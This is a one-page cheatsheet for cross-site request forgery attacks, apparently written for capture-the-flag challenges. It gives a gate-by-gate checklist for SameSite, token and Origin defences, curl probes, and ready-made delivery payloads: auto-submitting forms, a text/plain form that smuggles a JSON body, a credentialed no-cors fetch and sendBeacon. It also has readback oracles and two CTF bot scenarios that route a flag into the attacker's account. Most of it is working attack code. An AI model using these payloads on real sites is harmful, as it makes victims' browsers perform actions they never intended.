# CSRF cheatsheet — the one-page reference

## The class in one line

Make a browser send a state-changing request the victim didn't
intend, under ambient credentials — a cookie, a localhost position,
or a shared jar.

## The six gates, in order

```
1. needs a session/credential?         → which one attaches?
2. SameSite=Strict?                    → dead for this cookie
   SameSite=Lax?                       → GET-write top-nav only
   SameSite=None+Secure / missing?     → full surface
3. a token required & session-bound?   → dead unless broken
4. Origin/Referer enforced exactly?    → dead unless bypassable
5. content-type only json + strict?    → dead via form; try lenient
6. the write does something useful?    → pick the marker/oracle
```

## The cookie-attribute read

```bash
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
# SameSite=Strict → dead    Lax → GET-nav only    None+Secure → open
# missing → modern=Lax, old-bot=None
```

## The token strip — the candidate signal

```bash
python3 tools/web/csrf_probe.py --url "$BASE/x" --method POST \
  --body 'a=1&csrf=T' --token-field csrf
# the stripped replay accepted → candidate
```

## The delivery shapes

```html
<!-- urlencoded POST -->
<form id=f action=URL method=POST><input name=a value=1></form>
<script>f.submit()</script>

<!-- text/plain JSON — = inside a string -->
<form id=f action=URL method=POST enctype=text/plain>
<input name='{"a":"' value='x","i":"'}'></form><script>f.submit()</script>

<!-- GET under Lax — top-level nav -->
<form id=f action=URL method=GET><input name=a value=1></form>
<script>f.submit()</script>

<!-- fetch no-cors -->
fetch(URL,{method:'POST',mode:'no-cors',credentials:'include',
  headers:{'Content-Type':'text/plain'},body:'{"a":1,"i":"="}'})

<!-- sendBeacon -->
navigator.sendBeacon(URL,new Blob(['{"a":1}'],{type:'text/plain'}))
```

## The JSON-body assembly rule

```text
every form-= must land inside a JSON string:
- a dummy key:  {"a":"1","i":"=","b":"2"}
- a real field: {"q":"search=term","page":1}
- split inputs at token boundaries — \r\n between them is whitespace
```

## The readback oracles

```bash
curl -s -b "$CJ" "$BASE/api/me" | grep -o 'csrf-marker'   # marker
curl -s "$BASE/stats" | grep -o 'host-x'                  # list
curl -s -b "$CJ" "$BASE/api/balance"                      # delta
```

## The two card shapes

```text
TornadoService: localhost/remote_ip gate + a bot → the bot's browser
  IS 127.0.0.1 → a form POST to loopback passes the gate
SSOS: shared cookie jar + text/plain JSON login → the Set-Cookie
  swaps the jar's token to your account → the bot writes the flag
  into your account
```

## The falsifier

```text
a token the page can't read AND session-bound, OR SameSite=Strict
with no GET write, OR enforced Origin/Referer + no bypass, OR
json-only content-type + strict + no sibling — and no stored-content
vector. then the class is closed; record refutes.
```

## The ledger

```bash
python3 tools/state.py <c> --hypothesis "csrf: <carrier> -> <oracle>"
python3 tools/hooks.py post-probe <c> --verdict confirms \
  --hypothesis-id <H> --class web-csrf --evidence-kind impact \
  --evidence 'marker on my object' --response '<body>'
```
